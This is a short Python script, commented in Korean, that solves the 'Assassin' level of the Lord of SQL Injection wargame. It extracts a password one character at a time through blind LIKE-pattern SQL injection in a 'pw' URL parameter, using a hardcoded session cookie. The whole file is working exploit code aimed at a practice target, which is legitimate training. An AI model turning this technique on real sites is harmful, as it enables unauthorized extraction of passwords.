# -*- coding : UTF-8 -*-
from requests import get
import string

print("#### Lord of SQL Injection - Assassin ####\n")

# URL을 설정합니다.
url = "http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php"

#쿠키를 세팅합니다. 반드시 당신의 쿠키로 설정해야 합니다.
cookies = dict(PHPSESSID="5u71g5vp7547tv8ffl7osl0fl5")

#ASCII의 문자를 저장합니다. (브루트포스할 때 필요)
abc = string.digits + string.ascii_letters

result = ""

#얻은 정보를 바탕으로 블라인드 SQL Injection을 진행합니다.
print("\n\n#### Starting Blind SQL Injection ####\n")
identify = 0
for i in range(1,20):
    for a in abc:
        param = "?pw=" + result + a + "%"
        new_url = url + param
        r = get(new_url, cookies=cookies)

        if r.text.find("<h2>Hello guest</h2>") > 0:
            identify = 1
            print(str(i) + "번 째 pw의 값은 '" + a + "' 입니다. ")
            result += a
            if r.text.find("<h2>ASSASSIN Clear!</h2>") > 0:
                print("축하합니다! Orge를 클리어했습니다.")

        
    if len(result) < (i-1):
        break

print("\n\n#### RESULT ####")
print("pw : " + result)
